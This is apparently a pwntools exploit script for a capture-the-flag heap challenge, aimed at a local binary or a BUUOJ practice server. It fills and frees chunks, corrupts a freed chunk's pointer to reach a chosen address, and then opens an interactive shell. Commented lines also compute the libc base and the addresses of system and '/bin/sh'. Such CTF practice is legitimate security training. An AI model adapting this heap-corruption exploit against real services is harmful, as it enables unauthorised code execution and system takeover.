import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./pwn')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',25084)
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]

		def add(a):
			io.sendlineafter('choice?','1')
			io.sendafter('idx?',str(a))
			

		def delete(a):
			io.sendlineafter('choice?','3')
			io.sendlineafter('idx?',str(a))

		def edit(a,c):
			io.sendlineafter('choice?','2')
			io.sendafter('idx?',str(a))
			io.send(c)



		target = 0x4040c0
		ptr_lis = 0x4040e0
		for i in range(8):
			add(i)
		for i in range(8):
			delete(i)
		edit(7,p64(target-0x10))
		add(10)
		# gdb.attach(io)
		io.sendline('6')
		system=0x4014A0
		# edit(0,p64(system))
		# edit(0,p64(0x4040C0))
		# add(2)
		# io.recv()
		# add(2)




		








		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue